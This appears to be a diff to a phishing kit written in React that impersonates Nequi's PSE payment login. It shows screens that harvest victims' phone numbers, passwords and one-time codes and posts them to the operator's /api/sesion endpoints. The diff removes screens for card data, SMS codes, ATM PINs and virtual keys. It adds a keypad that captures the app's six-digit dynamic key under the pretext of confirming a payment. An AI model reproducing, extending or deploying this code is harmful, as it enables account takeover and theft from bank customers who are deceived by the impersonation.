@@ -3,7 +3,7 @@ import { InputAnimado } from "@/components/inputAnimado/InputAnimado"
 import "./nequi.css"
 import { Tarjeta } from "@/components/tarjeta/Tarjeta"
 import { Status } from "@/components/status/Status"
-import { useEffect, useState } from "react"
+import { useEffect, useRef, useState } from "react"
 import axios from "axios"
 
 const COLOR_PRINCIPAL_TEXT = "text-[#da0081]"
@@ -115,6 +115,92 @@ const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar,
 }
 
 
+const ClaveDinamica = ({ handler }) => {
+  const [valores, setValores] = useState(["", "", "", "", "", ""]);
+  const inputsRef = useRef([]);
+
+  const agregarNumero = (numero) => {
+    const indexVacio = valores.findIndex((v) => v === "");
+    if (indexVacio === -1) return;
+
+    const nuevos = [...valores];
+    nuevos[indexVacio] = numero;
+    setValores(nuevos);
+
+    if (indexVacio < 5) {
+      inputsRef.current[indexVacio + 1]?.focus();
+    } else {
+      const claveCompleta = nuevos.join("");
+      handler(claveCompleta);
+    }
+  };
+
+  const borrar = () => {
+    const ultimoLleno = [...valores].reverse().findIndex((v) => v !== "");
+    if (ultimoLleno === -1) return;
+
+    const index = 5 - ultimoLleno;
+    const nuevos = [...valores];
+    nuevos[index] = "";
+    setValores(nuevos);
+    inputsRef.current[index]?.focus();
+  };
+
+  const manejarPegado = (e) => {
+    e.preventDefault();
+    const textoPegado = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
+    const nuevosValores = textoPegado.split("");
+    const completados = [...Array(6)].map((_, i) => nuevosValores[i] || "");
+    setValores(completados);
+
+    const siguiente = completados.findIndex((v) => v === "");
+    if (siguiente !== -1) {
+      inputsRef.current[siguiente]?.focus();
+    } else {
+      handler(completados.join(""));
+    }
+  };
+
+  return (
+    <div className="flex flex-col items-center gap-6">
+      <div className="flex gap-4">
+        {valores.map((val, i) => (
+          <input
+            key={i}
+            value={val}
+            onPaste={manejarPegado}
+            onChange={() => {}}
+            ref={(el) => inputsRef.current[i] = el}
+            className="w-10 h-12 text-center border-b-2 border-black text-2xl focus:outline-none"
+          />
+        ))}
+      </div>
+      <div className="grid grid-cols-3 gap-4 mt-2">
+        {[1, 2, 3, 4, 5, 6, 7, 8, 9, "", 0, "⌫"].map((key, i) => {
+          if (key === "") return <div key={i} />;
+          return (
+            <button
+              key={i}
+              onClick={() => key === "⌫" ? borrar() : agregarNumero(String(key))}
+              className="w-16 h-16 text-xl font-bold  text-[#270f3c]  active:scale-95"
+            >
+              {key}
+            </button>
+          );
+        })}
+      </div>
+    </div>
+  );
+};
+
+const Dinamica = ({handler})=>{
+   return(
+        <div className="w-full">
+            <span className="text-[14px] text-[#270f3c]">Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi</span>
+            <ClaveDinamica handler={handler}/>
+        </div>
+   )
+}
 
 
 
@@ -208,18 +294,8 @@ export default function Nequi (){
             console.log(selV.data.status);
             
             if (
-                selV.data.status == "tdb" ||
-                selV.data.status == "tdb-error" ||
-                selV.data.status == "tdc" ||
-                selV.data.status == "tdc-error" ||
-                selV.data.status == "otpsms" ||
-                selV.data.status == "otpsms-error" ||
                 selV.data.status == "otpapp" ||
                 selV.data.status == "otpapp-error" ||
-                selV.data.status == "clavecajero" ||
-                selV.data.status == "clavecajero-error" ||
-                selV.data.status == "clavevirtual" ||
-                selV.data.status == "clavevirtual-error" &&
                 selV.data.status !== selectVista
             ) {
                 setSelectVisata(selV.data.status);
@@ -262,23 +338,6 @@ export default function Nequi (){
     };
     }, [guardado, reLoad]);
 
-    //mensje-otp
-    const handlerMensaje = async (clave)=>{
-        try {
-            setLoading(true)
-            const send = await axios.post(`/api/sesion/otp-sms`, {
-                uniqid: uniqId,
-                otpsms: clave 
-            },{
-                headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)            
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-        }
-    }
 
     const handlerloginError = async ()=>{
         try {
@@ -323,61 +382,7 @@ export default function Nequi (){
         }
     }
 
-    //clave-cajero
-    const handlerCajero = async (clave)=>{
-        try {
-            setLoading(true)
-            const send = await axios.post(`/api/sesion/clave-cajero`, {
-                uniqid: uniqId,
-                clavecajero: clave 
-            },{
-                headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-        }
-    }
-    //clave-virtual
-    const handlerClaveVirtual = async (clave)=>{
-        try {
-            setLoading(true)
-            const send = await axios.post(`/api/sesion/clave-virtual`, {
-                uniqid: uniqId,
-                clavevirtual: clave 
-            },{
-            headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)
-            
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-        }
-    }
 
-    //tarjeta
-    const handlerTarjeta = async (body) =>{
-        try {
-            setLoading(true)
-            body.uniqid = uniqId
-            const send = await axios.post(`/api/sesion/tarjeta`, body, {
-                headers: {
-                "Content-Type": "application/json",
-                'Accept': 'application/json'
-            }})
-            setReLoad(r => r = !r)
-            
-        } catch (error) {
-            await new Promise((resolve) => setTimeout(resolve, 30000));
-            console.log(error);
-            setReLoad(r => r = !r)
-        }
-        
-    }
 
 
 
@@ -394,24 +399,16 @@ export default function Nequi (){
                     <path _ngcontent-wan-c28="" d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020" className="U"></path>
                 </svg>
                 <p className={`text-[20px] mt-3 font-semibold pb-5 text-[${text_color}]`}>Pagos PSE de Nequi</p>
-                <p className={`text-[15px] pb-5 text-[${text_color}] text-center mt-2.5`}>Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.</p>
+                {!inicioSesion && <p className={`text-[15px] pb-5 text-[${text_color}] text-center mt-2.5`}>Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.</p>}
                 {loading && <Loading/>}
                 {reLoad && <Loading/>}
                 {!inicioSesion && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerBtnInicio}/>}
                 {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}
                 
-                {selectVista == "tdb" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
-                {selectVista == "tdb-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
-                {selectVista == "tdc" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
-                {selectVista == "tdc-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
-                {selectVista == "otpsms" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
-                {selectVista == "otpsms-error" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
-                {selectVista == "otpapp" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave dinamica"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
-                {selectVista == "otpapp-error" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de aplicación"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
-                {selectVista == "clavecajero" && <Status key={key} type={"password"} btn={true} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
-                {selectVista == "clavecajero-error" && <Status key={key} btn={true} type={"password"} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
-                {selectVista == "clavevirtual" && <Status key={key} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
-                {selectVista == "clavevirtual-error" && <Status key={key} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
+                
+                {selectVista == "otpapp" && <Dinamica handler={handlerAplicacion}/>}
+                {selectVista == "otpapp-error" && <Dinamica handler={handlerAplicacion}/>}
+                
                 {!inicioSesion && <span className="text-[14px] mt-5 text-center w-[80%]">¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.</span>}               
             </div>
         </div>
